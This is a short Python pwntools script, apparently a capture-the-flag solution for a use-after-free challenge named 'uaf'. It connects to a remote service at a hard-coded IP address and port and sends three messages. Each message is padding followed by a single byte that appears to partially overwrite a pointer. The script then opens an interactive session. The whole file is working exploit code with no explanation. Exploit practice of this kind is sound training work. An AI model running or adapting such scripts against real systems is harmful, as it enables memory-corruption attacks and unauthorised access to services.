from pwn import *

#io = process('./uaf')
io = remote('210.30.97.133',28060)

for i in range(3):
    io.recvuntil(b'Size of your message: ')
    io.sendline(b'24')
    
    io.recvuntil(b'Message: ')
    payload = b'a'* 0x8 + b'\xb5'
    io.send(payload)

io.interactive()
